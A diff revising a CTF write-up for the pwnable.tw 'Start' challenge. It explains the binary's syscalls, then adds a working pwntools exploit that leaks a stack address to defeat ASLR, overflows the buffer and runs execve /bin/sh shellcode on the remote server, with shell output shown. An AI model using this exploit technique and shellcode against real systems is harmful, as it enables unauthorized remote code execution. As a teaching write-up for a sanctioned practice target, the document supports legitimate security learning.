@@ -1,13 +1,8 @@
-Title: Pwnable.tw Start Writeup 
-Date: 2020-5-5 2:30 PM 
+Title: Pwnable.tw challenge 1 - Start 
+Date: 2020-5-19 2:30 PM 
 Category: CTF 
 
-The first step is to download the binary:
-
-```
-:::console
-$ wget https://pwnable.tw/static/chall/start
-```
+The first challenge from pwnable.tw, as the name of the site suggests, is a pwnable CTF challenge. The goal of the challenge is to pop a shell in the remote service and read out the flag, which we've been instructed should reside at '/home/start/flag'. The binary running on the remote server is provided for offline analysis and testing. 
 
 As usual, the first step is to 'file' the binary:
 
@@ -17,7 +12,7 @@ $ file start
 start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
 ```
 
-First off, note that the binary is 32-bit and was not compiled with -fPIC. Next let's disassemble:
+Note that the binary is 32-bit and was not compiled with -fPIC. This is good news, as it means the binary will get loaded at the same address in memory for each run. Next let's disassemble:
 
 ```
 :::objdump-nasm
@@ -59,7 +54,7 @@ Disassembly of section .text:
  80480a1:	cd 80                	int    0x80
 ```
 
-Notice the 'int 0x80' instructions - this is an "interupt" instruction that will cause any of the 256 entries in the IA32 exception table to run. In this case, "int 0x80" causes the exception handler 0x80 (decimal 128) to run, which is responsible for handling system calls. The system call to execute is controlled by placing the system call number in register eax. The system call table on my machine is located at /usr/include/asm/unistd_32.h:
+Notice the 'int 0x80' instructions - these are "interupt" instructions that will cause any of the 256 entries in the IA32 exception table to run. In this case, "int 0x80" causes the exception handler 0x80 to run, which is responsible for handling system calls. Each system call made avalabile by the kernel has a corresponding number. The system call table on my machine is located at /usr/include/asm/unistd_32.h:
 
 ```
 :::c
@@ -73,8 +68,7 @@ ifndef _ASM_X86_UNISTD_32_H
 #define __NR_write 4
 #define __NR_open 5
 ```
-
-Our target binary moves the value 0x4 into register 'al' - the lower 8 bits of eax - just prior to the `int 0x80` instruction. Consulting the table above, we see that this corresponds to the 'write' system call. From the man pages, we see:
+A program controls which system call to execute by placing the system call number in register eax. Our target binary places the value 0x4 into register 'al' - the lower 8 bits of eax - just prior to the `int 0x80` instruction. Consulting the table above, we see that this corresponds to the 'write' system call. From the man pages, we see:
 
 ```
 :::console
@@ -91,7 +85,7 @@ SYNOPSIS
        ssize_t write(int fd, const void *buf, size_t count);
 ```
 
-The write system call takes three arguments. Instead of passing parameters on the stack (as happens with function calls in IA32), they are passed via general purpose registers. The syscall number is placed in eax, and arguments are placed in ebx, ecx, edx, esi, edi, and ebp - up to six arbitrary arguments. With that, we know that the fd (file descriptor) argument will be placed in ebx, the buffer 'buf' (the data to be written to the file descriptor) into ecx, and finally 'count' (the number of bytes to be written) to the file descriptor.
+The write system call takes three arguments. Instead of passing parameters on the stack (as happens with function calls in IA32), they are passed via general purpose registers. The syscall number is placed in eax, and arguments are placed in ebx, ecx, edx, esi, edi, and ebp - up to six arbitrary arguments. With that, we know that the file descriptor argument will be placed in ebx, a pointer to the data to be written to the file descriptor into ecx, and finally the number of bytes to be written to the file descriptor into edx.
 
 A C representation of the system call might look as follows:
 ```
@@ -99,7 +93,7 @@ A C representation of the system call might look as follows:
 write(1, sp, 0x14);
 ```
 
-Where 1 represents the standard output file descriptor, kp is the pointer to the top of the stack, and 0x14 (or 20 in decimal) bytes to be written. I used binary ninja to decode the data being pushed on to the stack just prior to the call to write as characters:
+Where 1 represents the standard output file descriptor, sp is a pointer to the top of the stack, and 0x14 (or 20 in decimal) bytes to be written. I used Binary Ninja to decode the data being pushed on to the stack just prior to the call to write as characters:
 
 ![image info]({static}/images/start.png)
 
@@ -234,4 +228,61 @@ $ ls
 [*] Got EOF while sending in interactive
 ```
 
-r <<< $(python -c 'print "\x41"*20 + "\xac\xd3\xff\xff" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+No good.. ASLR seems to be enabled on the remote challenge server. In order to properly exploit this binary with ASLR, we'll need to somehow "leak" a stack address. We can then compute the offset between the leaked address and the start of our shellcode, which will remain constant regardless of where the stack is loaded into the process memory space - therefore providing a reliable method to compute the address of our shellcode.
+
+After poking around the binary a bit in Binary Ninja, I noticed a suspicious `push esp` instruction at the beginning of the main function. As "luck" would have it, the program only adds 0x14 to the stack in its cleanup postamble - just enough to clean up the 5 pushes for the output string, but not the stack pointer value pushed onto the stack at the start. Also lucky for us, the program moves esp into ecx (line 8048087) just prior to the write system call. For the write call, the string pointer value in ecx will be used for the buffer to be written to stdout. Therefore, if we use the buffer overflow from the read function (line 8048097) to redirect program control to line 8048087, we can force the program to leak a stack address. After the call to write, the program will continue to the vulnerable read function, which we'll exploit for a _second_ time, this time redirecting program control to our shellcode, which through a little experimentation in gdb, I discovered to be the leaked address + 20.
+
+The final pwntool sript is as follows:
+
+```
+:::python3
+from pwn import *
+
+shellcode = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
+conn = remote('chall.pwnable.tw', 10000)
+r = conn.recvuntil(':')
+
+# Leak stack address
+payload = b'\x41'*20 + p32(0x08048087, endian='little')
+conn.send(payload)
+r = conn.recv(20)
+leaked_esp = unpack(r[:4])
+
+# Send payload using leaked stack info
+payload = b'\x41'*20 + p32(leaked_esp + 20, endian='little') + shellcode
+conn.send(payload)
+
+conn.interactive()
+```
+
+Run it, and we get a shell on the remote service!
+
+```
+:::console
+$ python3 start.py
+[+] Opening connection to chall.pwnable.tw on port 10000: Done
+[*] Switching to interactive mode
+$ ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+$
+```
